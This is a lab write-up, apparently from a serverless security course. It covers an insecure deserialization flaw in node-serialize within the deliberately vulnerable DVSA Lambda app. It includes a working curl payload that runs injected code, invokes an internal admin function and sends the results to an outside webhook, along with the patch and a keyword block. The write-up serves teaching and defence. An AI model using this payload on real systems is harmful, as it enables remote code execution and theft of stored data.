
# Lesson #3: Sensitive Information Disclosure (Code Injection → S3 Data Exposure)

---

## Overview

This lesson demonstrates a **Sensitive Information Disclosure** vulnerability caused by **unsafe deserialization** in a serverless Node.js application.

An attacker can inject malicious JavaScript into a request, which gets executed inside an **AWS Lambda function**, allowing them to invoke internal admin functionality and retrieve **sensitive data (order receipts) from Amazon S3**.

---

## Vulnerability Summary

* **Type:** Sensitive Information Disclosure + Code Injection
* **Cause:** Insecure deserialization
* **Component:** AWS Lambda (DVSA-ORDER-MANAGER)
* **Library:** `node-serialize`
* **Impact:** Unauthorized access to sensitive S3 data

---

## Root Cause

The application uses:

```js
serialize.unserialize(event.body)
```

The `node-serialize` library:

* Allows function deserialization
* Executes payloads using `_$$ND_FUNC$$_function(){...}`
* Does not validate input

This allows attackers to execute arbitrary code inside the Lambda function.

---

## Target Endpoint

```
https://82gs6ao5w2.execute-api.us-east-1.amazonaws.com/Stage/order
```

---

## Exploit Demonstration

### Attack Request

```bash
curl -s -X POST "https://82gs6ao5w2.execute-api.us-east-1.amazonaws.com/Stage/order" \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer dummy' \
-d '{"action": "_$$ND_FUNC$$_function(){var {Lambda}=require(\"@aws-sdk/client-lambda\");var lambda=new Lambda({});lambda.invoke({FunctionName:\"DVSA-ADMIN-GET-RECEIPT\",Payload:Buffer.from(JSON.stringify({\"year\":\"2026\",\"month\":\"04\"}))}).then(d=>{var p=Buffer.from(d.Payload).toString();require(\"https\").get(\"https://webhook.site/d6b2aba3-110c-4538-86e4-cb821996de38/?data=\"+encodeURIComponent(p));}).catch(e=>{console.error(\"ERR\",e)});}()", "cart-id":""}'
```

---

### Expected Response

```json
{"message":"Internal server error"}
```

This is expected — the exploit still succeeds.

---

## Proof of Exploit

### Webhook Evidence

Webhook receives request from AWS Lambda (Virginia IP):

```
data = { "status":"ok", "download_url":"https://...s3.amazonaws.com/...zip" }
```

---

### S3 Data Access

Opening the `download_url`:

* Downloads file:

```
2026-04-dvsa-order-receipts.zip
```

Confirms:

* Code execution inside Lambda
* Internal admin function invocation
* Unauthorized access to sensitive data

---

## Fix Implementation

### Before (Vulnerable)

```js
const serialize = require('node-serialize');

var req = serialize.unserialize(event.body); 
var headers = serialize.unserialize(event.headers);
```

---

### After (Fixed)

```js
// Input validation (early blocking)
if (typeof event.body !== "string") {
    return callback(null, {
        statusCode: 400,
        body: JSON.stringify({ status: "err", message: "Invalid request" })
    });
}

if (event.body.includes("_$$ND_FUNC$$_")) {
    return callback(null, {
        statusCode: 400,
        body: JSON.stringify({ status: "err", message: "Malicious input detected" })
    });
}

// Safe parsing
var req = JSON.parse(event.body);
var headers = event.headers;
```

---

### Additional Protection

```js
const allowedActions = ["new","update","cancel","get","orders", ...];

if (!allowedActions.includes(req.action)) {
    return callback(null, {
        statusCode: 400,
        body: JSON.stringify({ status: "err", message: "Malicious input detected" })
    });
}
```

---

## Verification After Fix

After applying the fix:

* Attack request is rejected
* Response:

```json
{ "status": "err", "message": "Malicious input detected" }
```

* No webhook request received
* No S3 URL generated
* No ZIP file downloaded

---

## Security Analysis

### Intended Behavior

* User input should be treated as data only
* Internal admin functions should not be accessible

---

### Exploit Behavior

* Input executed as code
* Internal Lambda invoked
* Sensitive S3 data exposed

---

### Fix Outcome

* Input parsed safely using `JSON.parse()`
* Malicious payload blocked early
* No code execution possible

---

## Lessons Learned

* Never execute user-controlled input
* Avoid unsafe deserialization libraries
* Always validate and sanitize input
* Apply least privilege in serverless systems
* Separate user-facing logic from internal admin functionality

---

## Tools Used

* AWS API Gateway
* AWS Lambda
* AWS S3
* Webhook.site
* curl

---

## Folder Structure

* `vulnerable-code/`: original Lambda code
* `fixed-code/`: patched version
* `exploit/`: curl attack commands
* `screenshots/`: webhook + S3 proof

---

## How to Reproduce

1. Deploy DVSA on AWS
2. Identify API Gateway endpoint
3. Run exploit command
4. Check Webhook.site for response
5. Extract `download_url`
6. Download ZIP from S3
7. Apply fix and test again



